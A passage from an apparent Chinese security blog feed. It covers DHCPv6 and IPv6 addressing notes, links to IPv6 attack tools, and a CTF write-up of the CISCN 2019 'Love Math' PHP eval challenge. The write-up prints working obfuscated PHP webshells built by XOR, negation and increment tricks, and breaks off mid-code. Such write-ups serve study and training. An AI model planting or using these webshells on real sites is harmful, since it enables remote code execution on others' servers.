REQUEST</td><td>如果Renew报文没有得到应答，DHCPv6客户端向任意可达的DHCPv6服务器发送Rebind报文来延长地址的生存期并更新配置信息。</td></tr><tr><td>7</td><td>REPLY</td><td align="left">DHCP ACK/NAK</td><td>DHCPv6服务器在以下场合发送Reply报文：DHCPv6服务器发送携带了地址和配置信息的Reply消息来回应从DHCPv6客户端收到的Solicit、Request、Renew、Rebind报文。DHCPv6服务器发送携带配置信息的Reply消息来回应收到的Information-Request报文。用来回应DHCPv6客户端发来的Confirm、Release、Decline报文。</td></tr><tr><td>8</td><td>RELEASE</td><td align="left">DHCP RELEASE</td><td>DHCPv6客户端向为其分配地址的DHCPv6服务器发送Release报文，表明自己不再使用一个或多个获取的地址。</td></tr><tr><td>9</td><td>DECLINE</td><td align="left">DHCP DECLINE</td><td>DHCPv6客户端向DHCPv6服务器发送Decline报文，声明DHCPv6服务器分配的一个或多个地址在DHCPv6客户端所在链路上已经被使用了。</td></tr><tr><td>10</td><td>RECONFIGURE</td><td align="left">-</td><td>DHCPv6服务器向DHCPv6客户端发送Reconfigure报文，用于提示DHCPv6客户端，在DHCPv6服务器上存在新的网络配置信息。</td></tr><tr><td>11</td><td>INFORMATION-REQUEST</td><td align="left">DHCP INFORM</td><td>DHCPv6客户端向DHCPv6服务器发送Information-Request报文来请求除IPv6地址以外的网络配置信息。</td></tr><tr><td>12</td><td>RELAY-FORW</td><td align="left">-</td><td>中继代理通过Relay-Forward报文来向DHCPv6服务器转发DHCPv6客户端请求报文。</td></tr><tr><td>13</td><td>RELAY-REPL</td><td align="left">-</td><td>DHCPv6服务器向中继代理发送Relay-Reply报文，其中携带了转发给DHCPv6客户端的报文。</td></tr></tbody></table><h4 id="DHCPv6工作原理"><a href="#DHCPv6工作原理" class="headerlink" title="DHCPv6工作原理"></a>DHCPv6工作原理</h4><p>DHCPv6自动分配分为DHCPv6有状态自动分配和DHCPv6无状态自动分配。</p><ul><li>DHCPv6有状态自动分配。DHCPv6服务器自动配置IPv6地址/前缀，同时分配DNS、NIS、SNTP服务器等网络配置参数。</li><li>DHCPv6无状态自动分配。主机IPv6地址仍然通过路由通告方式自动生成，DHCP服务器只分配除IPv6地址以外的配置参数，包括DNS、NIS、SNTP服务器地址等参数。</li></ul><h4 id="DHCPv6有状态自动分配"><a href="#DHCPv6有状态自动分配" class="headerlink" title="DHCPv6有状态自动分配"></a>DHCPv6有状态自动分配</h4><p>主要分为两种分配方式：1. 四步交互 2. 两步交互</p><h5 id="1-四步交互分配"><a href="#1-四步交互分配" class="headerlink" title="1. 四步交互分配"></a>1. 四步交互分配</h5><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191127155119975.png" alt="image-20191127155119975"></p><ol><li>DHCPv6客户端发送Solicit报文，请求DHCPv6服务器为其分配IPv6地址和网络配置参数。</li><li>如果Solicit报文中没有携带Rapid Commit选项，或Solicit报文中携带Rapid Commit选项，但服务器不支持快速分配过程，则DHCPv6服务器回复Advertise报文，通知客户端可以为其分配的地址和网络配置参数。</li><li>如果DHCPv6客户端接收到多个服务器回复的Advertise报文，则根据Advertise报文中的服务器优先级等参数，选择优先级最高的一台服务器，并向所有的服务器发送Request组播报文，该报文中携带已选择的DHCPv6服务器的<strong>DUID</strong>。</li><li>DHCPv6服务器回复Reply报文，确认将地址和网络配置参数分配给客户端使用。</li></ol><hr><p> <strong>DUID</strong>(DHCP Unique Identifier,DHCP唯一标识符)是唯一标识一台DHCPv6设备(包括客户端、中继和服务器)的标识符 </p><hr><h5 id="2-两步交互快速分配"><a href="#2-两步交互快速分配" class="headerlink" title="2. 两步交互快速分配"></a>2. 两步交互快速分配</h5><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191127155448677.png" alt="image-20191127155448677"></p><p> 两步交互常用于网络中只有一个DHCPv6服务器的情况。DHCPv6客户端首先通过组播发送Solicit报文来定位可以为其提供服务的DHCPv6服务器，DHCPv6服务器收到客户端的Solicit报文后，为其分配地址和配置信息，直接回应Reply报文，完成地址申请和分配过程。 </p><hr><p>Rapid Commit option用于指定在多DHCP服务器的情况下是否使用快速分配模式，如果规定不支持快速分配过程，则采用四部交互方式进行IP地址分配</p><hr><h4 id="DHCPv6无状态自动分配"><a href="#DHCPv6无状态自动分配" class="headerlink" title="DHCPv6无状态自动分配"></a>DHCPv6无状态自动分配</h4><p>无状态自动分配地址也只需要两步来完成，不同的是客户端发送的DHCPv6数据包类型为information-Request</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191127155648023.png" alt="image-20191127155648023"></p><h5 id="1-工作流程"><a href="#1-工作流程" class="headerlink" title="1. 工作流程"></a>1. 工作流程</h5><p>如下：</p><ol><li>DHCPv6客户端以组播方式向DHCPv6服务器发送Information-Request报文，该报文中携带Option Request选项，指定DHCPv6客户端需要从DHCPv6服务器获取的配置参数。</li><li>DHCPv6服务器收到Information-Request报文后，为DHCPv6客户端分配网络配置参数，并单播发送Reply报文，将网络配置参数返回给DHCPv6客户端。DHCPv6客户端根据收到Reply报文提供的参数完成DHCPv6客户端无状态配置</li></ol><h3 id="四、无DHCP时的IP分配机制"><a href="#四、无DHCP时的IP分配机制" class="headerlink" title="四、无DHCP时的IP分配机制"></a>四、无DHCP时的IP分配机制</h3><p>参考资料：<a href="https://blog.csdn.net/nbvnvnvbn/article/details/97902155">https://blog.csdn.net/nbvnvnvbn/article/details/97902155</a> EUI-64格式生成</p><h4 id="无状态自动配置"><a href="#无状态自动配置" class="headerlink" title="无状态自动配置"></a>无状态自动配置</h4><p>在IPV6中，无状态自动配置机制使用EUI-64格式来自动配置IPV6地址</p><p>无状态自动配置是指在网络中没有DHCP服务器的情况下，允许节点自动配置IPV6地址的机制。</p><h5 id="1-构造规则"><a href="#1-构造规则" class="headerlink" title="1. 构造规则"></a>1. 构造规则</h5><p> 自动将48bit的以太网MAC地址扩展成64bit，再组合一个64位的ipv6地址前缀，组成一个IPV6地址。 </p><p>示例：</p><p> a. MAC地址为 00-AA-00-3F-2A-1C</p><p> b.转换EUI-64为 00-AA-00-FF-FE-3F-2A-1C</p><p>  c.第一个字节为0000 0000，第7为反转为0000 0010转换16进制为0x02。</p><p>  d.得到结果为02-AA-00-FF-FE-3F-2A-1C，转换为ip6表示格式为2AA:FF:FE3F:2A1C</p><p>链路本地地址也是采取这个规则进行</p><hr><p>版权声明：本文为CSDN博主「nbvnvnvbn」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/nbvnvnvbn/article/details/97902155">https://blog.csdn.net/nbvnvnvbn/article/details/97902155</a></p><h2 id="0x04-IPV6-模拟环境搭建"><a href="#0x04-IPV6-模拟环境搭建" class="headerlink" title="0x04 IPV6 模拟环境搭建"></a>0x04 IPV6 模拟环境搭建</h2><p>参考链接：</p><ol><li><a href="https://blog.csdn.net/cxb14897/article/details/90021740">https://blog.csdn.net/cxb14897/article/details/90021740</a> 华为模拟器eNSP下载与安装教程</li></ol><h2 id="0x05-IPv6安全问题"><a href="#0x05-IPv6安全问题" class="headerlink" title="0x05 IPv6安全问题"></a>0x05 IPv6安全问题</h2><p>参考资料：</p><ol><li><a href="http://www.h3c.com/cn/d_201309/796460_30008_0.htm">http://www.h3c.com/cn/d_201309/796460_30008_0.htm</a> 浅谈IPv6协议安全及攻击</li><li><a href="https://blog.csdn.net/weixin_33895475/article/details/92827636">https://blog.csdn.net/weixin_33895475/article/details/92827636</a> 支持ipv6类型的ddos测试工具thc-ipv6 </li></ol><h3 id="一、安装IPv6安全工具THC-IPV6"><a href="#一、安装IPv6安全工具THC-IPV6" class="headerlink" title="一、安装IPv6安全工具THC-IPV6"></a>一、安装IPv6安全工具THC-IPV6</h3><p>参考文章：</p><ol><li><a href="https://zhuanlan.zhihu.com/p/33199299">https://zhuanlan.zhihu.com/p/33199299</a></li><li><a href="https://download.csdn.net/download/chengxi1014/10665729">https://download.csdn.net/download/chengxi1014/10665729</a></li><li><a href="https://www.kancloud.cn/haoyuanqiang/kali_linux_tools_documents/1060389">https://www.kancloud.cn/haoyuanqiang/kali_linux_tools_documents/1060389</a></li><li><a href="https://tools.kali.org/information-gathering/thc-ipv6">https://tools.kali.org/information-gathering/thc-ipv6</a></li><li><a href="https://kali.tuisec.win/kalitools/thc-ipv6_zh.html">https://kali.tuisec.win/kalitools/thc-ipv6_zh.html</a></li><li><a href="https://gitlab.com/kalilinux/packages/thc-ipv6/">https://gitlab.com/kalilinux/packages/thc-ipv6/</a></li></ol><h4 id="攻击测试："><a href="#攻击测试：" class="headerlink" title="攻击测试："></a>攻击测试：</h4><h5 id="1-fake-router6"><a href="#1-fake-router6" class="headerlink" title="1. fake_router6"></a>1. fake_router6</h5><p>参考链接：<a href="http://theevilbit.blogspot.com/2012/02/ipv6-pentesting-5-fakerouter6.html">http://theevilbit.blogspot.com/2012/02/ipv6-pentesting-5-fakerouter6.html</a></p><p>2001:db8:bad:bad::/64</p><h3 id="二、各种威胁的汇总文章："><a href="#二、各种威胁的汇总文章：" class="headerlink" title="二、各种威胁的汇总文章："></a>二、各种威胁的汇总文章：</h3><p><a href="https://www.secrss.com/articles/13813">https://www.secrss.com/articles/13813</a></p><p>移动白皮书</p><p><a href="https://www.secrss.com/articles/13103">https://www.secrss.com/articles/13103</a> IPv6环境下的网络安全观察</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>IPv6</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>IPv6</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CISCN 2019初赛】Love Math</title>
    <link href="/2019/10/19/%E3%80%90CISCN-2019%E5%88%9D%E8%B5%9B%E3%80%91Love-Math/"/>
    <url>/2019/10/19/%E3%80%90CISCN-2019%E5%88%9D%E8%B5%9B%E3%80%91Love-Math/</url>
    
    <content type="html"><![CDATA[<p>好好复习一下国赛的数学题。。。</p><p>参考链接：<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a> 刷题记录：[CISCN 2019 初赛]Love Math</p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h1><p>进入之后直接给了源码：</p><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-comment">//例子 c=20-1</span>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);    &#125;    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//帮你算出答案</span>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);&#125;</code></pre></div><p>限制如下：</p><ol><li><p>限制长度为80个字符</p></li><li><p>过滤了 <code> </code>‘ ‘, ‘\t’, ‘\r’, ‘\n’,’\‘’, ‘“‘, ‘`‘, ‘\[‘, ‘]‘;  ` </p></li><li><p>白名单里限制只使用一些数学函数</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];</code></pre></div></li><li><p>需要构造的就是命令执行</p></li></ol><p>先用脚本看看还能使用哪些字符：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$unfilter_str</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii</span>++) &#123;    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, chr(<span class="hljs-variable">$ascii</span>)) &amp;&amp; !in_array(chr(<span class="hljs-variable">$ascii</span>),<span class="hljs-variable">$blacklist</span>)) &#123;        <span class="hljs-variable">$unfilter_str</span>[] = (chr(<span class="hljs-variable">$ascii</span>));    &#125;<span class="hljs-comment">//    print_r(&#x27;\&#x27;&#x27; . implode(&#x27;\&#x27;,\&#x27;&#x27;, $unfilter_str) . &#x27;\&#x27;&#x27;);</span>&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;print_r(<span class="hljs-variable">$unfilter_str</span>);print_r(pi())<span class="hljs-meta">?&gt;</span></code></pre></div><p>结果如下：</p><div class="hljs code-wrapper"><pre><code class="hljs php">[<span class="hljs-number">32</span>] =&gt; ![<span class="hljs-number">33</span>] =&gt; <span class="hljs-comment">#</span>[<span class="hljs-number">34</span>] =&gt; $[<span class="hljs-number">35</span>] =&gt; %[<span class="hljs-number">36</span>] =&gt; &amp;[<span class="hljs-number">37</span>] =&gt; ([<span class="hljs-number">38</span>] =&gt; )[<span class="hljs-number">39</span>] =&gt; *[<span class="hljs-number">40</span>] =&gt; +[<span class="hljs-number">41</span>] =&gt; ,[<span class="hljs-number">42</span>] =&gt; -[<span class="hljs-number">43</span>] =&gt; .[<span class="hljs-number">44</span>] =&gt; /[<span class="hljs-number">45</span>] =&gt; <span class="hljs-number">0</span>[<span class="hljs-number">46</span>] =&gt; <span class="hljs-number">1</span>[<span class="hljs-number">47</span>] =&gt; <span class="hljs-number">2</span>[<span class="hljs-number">48</span>] =&gt; <span class="hljs-number">3</span>[<span class="hljs-number">49</span>] =&gt; <span class="hljs-number">4</span>[<span class="hljs-number">50</span>] =&gt; <span class="hljs-number">5</span>[<span class="hljs-number">51</span>] =&gt; <span class="hljs-number">6</span>[<span class="hljs-number">52</span>] =&gt; <span class="hljs-number">7</span>[<span class="hljs-number">53</span>] =&gt; <span class="hljs-number">8</span>[<span class="hljs-number">54</span>] =&gt; <span class="hljs-number">9</span>[<span class="hljs-number">55</span>] =&gt; :[<span class="hljs-number">56</span>] =&gt; ;[<span class="hljs-number">57</span>] =&gt; &lt;[<span class="hljs-number">58</span>] =&gt; =[<span class="hljs-number">59</span>] =&gt; &gt;[<span class="hljs-number">60</span>] =&gt; ?[<span class="hljs-number">61</span>] =&gt; @[<span class="hljs-number">62</span>] =&gt; \[<span class="hljs-number">63</span>] =&gt; ^[<span class="hljs-number">64</span>] =&gt; &#123;[<span class="hljs-number">65</span>] =&gt; |[<span class="hljs-number">66</span>] =&gt; &#125;[<span class="hljs-number">67</span>] =&gt; ~</code></pre></div><hr><h1 id="0x02-知识补充"><a href="#0x02-知识补充" class="headerlink" title="0x02 知识补充"></a>0x02 知识补充</h1><h2 id="php中的函数动态执行"><a href="#php中的函数动态执行" class="headerlink" title="php中的函数动态执行"></a>php中的函数动态执行</h2><p>示例如下:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;print_r&#x27;</span>;<span class="hljs-variable">$a</span>(<span class="hljs-keyword">array</span>());<span class="hljs-comment">#Array</span><span class="hljs-comment">#(</span><span class="hljs-comment">#)</span></code></pre></div><p>构造webshell的时候，可以先构造出函数名，然后利用函数名来动态执行。</p><h2 id="php中的函数名即为字符串"><a href="#php中的函数名即为字符串" class="headerlink" title="php中的函数名即为字符串"></a>php中的函数名即为字符串</h2><p>函数名为字符串也就是说可以对函数名进行异或，这里的白名单中还是有很多的函数名，所以可以好好利用一番</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> urlencode(ashin^pi);<span class="hljs-comment"># %11%1A</span></code></pre></div><h2 id="无数字字母webshell"><a href="#无数字字母webshell" class="headerlink" title="无数字字母webshell"></a>无数字字母webshell</h2><p>参考链接：</p><ul><li><p><a href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a> 无字母数字Webshell之提高篇</p></li><li><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> 一些不包含数字和字母的webshell</p></li></ul><h5 id="一、无字母数字的webshell"><a href="#一、无字母数字的webshell" class="headerlink" title="一、无字母数字的webshell"></a>一、无字母数字的webshell</h5><p>构造主要来源：</p><ol><li><p>字符的异或</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span></code></pre></div></li><li><p>字符的取反</p><div class="hljs code-wrapper"><pre><code class="hljs php">print_r(urlencode(~<span class="hljs-string">&#x27;a&#x27;</span>));</code></pre></div></li><li><p>UTF-8编码的某个部分取反</p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191101090153209.png" alt="image-20191101090153209" style="zoom:50%;" /><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);</code></pre></div></li><li><p>通过自增和函数名或者变量类型名，然后通过[ ]索引取出字</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><span class="hljs-variable">$___</span>=<span 